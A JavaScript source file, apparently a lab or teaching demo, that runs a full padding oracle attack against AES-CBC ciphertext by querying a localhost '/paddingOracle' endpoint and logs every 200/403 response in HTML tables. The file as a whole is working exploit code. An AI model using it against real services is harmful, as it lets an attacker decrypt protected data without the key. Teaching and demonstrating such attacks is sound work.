var API = 'http://localhost:5001';

function hexToBytes(hex) {
    var b = new Uint8Array(hex.length >> 1);
    for (var i = 0; i < hex.length; i += 2)
        b[i >> 1] = parseInt(hex.slice(i, i + 2), 16);
    return b;
}

function bytesToHex(b) {
    return Array.from(b, function (x) { return x.toString(16).padStart(2, '0'); }).join('');
}

function h(n) { return '0x' + n.toString(16).padStart(2, '0'); }

function charOf(b) { return (b >= 0x20 && b < 0x7f) ? String.fromCharCode(b) : '.'; }

async function post(endpoint, body) {
    return fetch(API + endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });
}

var totalReq = 0, total403 = 0, total200 = 0;
var running = false;
var recMap = new Map();

var queue403 = [];
var pending403 = false;

function add403(req, bi, bytePos, b, targetPad) {
    queue403.push([req, bi, bytePos, b, targetPad]);
    if (!pending403) {
        pending403 = true;
        requestAnimationFrame(flush403);
    }
}

function flush403() {
    pending403 = false;
    var tbody = document.getElementById('tbody403');
    var frag = document.createDocumentFragment();
    for (var i = 0; i < queue403.length; i++) {
        var e = queue403[i];
        var tr = document.createElement('tr');
        tr.innerHTML =
            '<td class="dim">' + e[0] + '</td>' +
            '<td>C[' + e[1] + ']</td>' +
            '<td>' + (16 - e[2]) + '/16</td>' +
            '<td>' + h(e[3]) + '</td>' +
            '<td>' + h(e[4]) + '</td>' +
            '<td class="fail">403</td>';
        frag.appendChild(tr);
    }
    queue403 = [];
    tbody.appendChild(frag);
    while (tbody.rows.length > 200) tbody.deleteRow(0);
    var div = tbody.closest('div');
    div.scrollTop = div.scrollHeight;
}

function add200(req, bi, bytePos, b, targetPad, interm, plainByte) {
    var tbody = document.getElementById('tbody200');
    var tr = document.createElement('tr');
    tr.innerHTML =
        '<td class="dim">' + req + '</td>' +
        '<td>C[' + bi + ']</td>' +
        '<td>' + (16 - bytePos) + '/16</td>' +
        '<td>' + h(b) + '</td>' +
        '<td>' + h(targetPad) + '</td>' +
        '<td class="ok">' + h(interm) + ' (' + h(b) + ' XOR ' + h(targetPad) + ')</td>' +
        '<td class="ok">' + h(plainByte) + '</td>' +
        '<td class="ok">' + charOf(plainByte) + '</td>';
    tbody.appendChild(tr);
    var div = tbody.closest('div');
    div.scrollTop = div.scrollHeight;
}

async function oracle(modPrev, ctBlock, bi, bytePos, b, targetPad) {
    totalReq++;
    total403++;
    document.getElementById('sTotal').textContent = totalReq;
    document.getElementById('s403').textContent = total403;

    var payload = bytesToHex(new Uint8Array([...modPrev, ...ctBlock]));
    var r = await post('/paddingOracle', { ciphertext: payload });
    var ok = r.status === 200;

    if (ok) {
        total403--;
        total200++;
        document.getElementById('s403').textContent = total403;
        document.getElementById('s200').textContent = total200;
    } else {
        add403(totalReq, bi, bytePos, b, targetPad);
    }
    return ok;
}



function updateDisplay(totalBytes) {
    var s = '';
    for (var i = 0; i < totalBytes; i++)
        s += recMap.has(i) ? charOf(recMap.get(i)) : '_';
    document.getElementById('recDisplay').textContent = s;
}

function arreter() { running = false; }

async function lancerAttaque() {
    var hex = document.getElementById('ctInput').value.trim();
    if (!hex || hex.length < 64 || hex.length % 32 !== 0) {
        alert('Hex invalide. Longueur attendue : multiple de 32 caracteres (IV + au moins 1 bloc).');
        return;
    }

    running = true;
    totalReq = total403 = total200 = 0;
    recMap.clear();

    document.getElementById('btnLancer').disabled = true;
    document.getElementById('btnStop').style.display = 'inline';
    document.getElementById('zoneResult').style.display = 'none';
    document.getElementById('zoneAttaque').style.display = 'block';
    document.getElementById('tbody403').innerHTML = '';
    document.getElementById('tbody200').innerHTML = '';
    document.getElementById('s403').textContent = '0';
    document.getElementById('s200').textContent = '0';
    document.getElementById('sTotal').textContent = '0';

    var allBytes = hexToBytes(hex);
    var nBlocks = allBytes.length / 16;
    var nCtBlocks = nBlocks - 1;
    var totalBytes = nCtBlocks * 16;

    var blocks = [];
    for (var i = 0; i < nBlocks; i++)
        blocks.push(allBytes.slice(i * 16, (i + 1) * 16));

    updateDisplay(totalBytes);

    outer: for (var bi = 1; bi <= nCtBlocks; bi++) {
        if (!running) break;
        var ctBlock = blocks[bi];
        var prevOrig = blocks[bi - 1];
        var interm = new Uint8Array(16);

        for (var bytePos = 15; bytePos >= 0; bytePos--) {
            if (!running) break outer;
            var targetPad = 16 - bytePos;

            for (var b = 0; b <= 255; b++) {
                if (!running) break;

                var modPrev = new Uint8Array(prevOrig);
                modPrev[bytePos] = b;
                for (var p = bytePos + 1; p < 16; p++)
                    modPrev[p] = interm[p] ^ targetPad;

                if (!await oracle(modPrev, ctBlock, bi, bytePos, b, targetPad)) continue;

                if (bytePos === 15) {
                    var check = new Uint8Array(modPrev);
                    check[14] ^= 0x01;
                    if (!await oracle(check, ctBlock, bi, bytePos, b, targetPad)) continue;
                }

                var intermVal = b ^ targetPad;
                var plainByte = intermVal ^ prevOrig[bytePos];
                interm[bytePos] = intermVal;
                recMap.set((bi - 1) * 16 + bytePos, plainByte);
                updateDisplay(totalBytes);
                add200(totalReq, bi, bytePos, b, targetPad, intermVal, plainByte);
                break;
            }
        }
    }

    var raw = [];
    for (var i = 0; i < totalBytes; i++)
        raw.push(recMap.has(i) ? recMap.get(i) : 0x3f);

    var trimmed = raw.slice();
    var padVal = trimmed[trimmed.length - 1];
    if (padVal >= 1 && padVal <= 16 && trimmed.slice(-padVal).every(function (v) { return v === padVal; }))
        trimmed = trimmed.slice(0, -padVal);

    var recovered = new TextDecoder().decode(new Uint8Array(trimmed));

    document.getElementById('recMsg').textContent = recovered;
    document.getElementById('rTotal').textContent = totalReq;
    document.getElementById('r403').textContent = total403;
    document.getElementById('r200').textContent = total200;
    document.getElementById('zoneResult').style.display = 'block';

    document.getElementById('btnLancer').disabled = false;
    document.getElementById('btnStop').style.display = 'none';
    running = false;
}
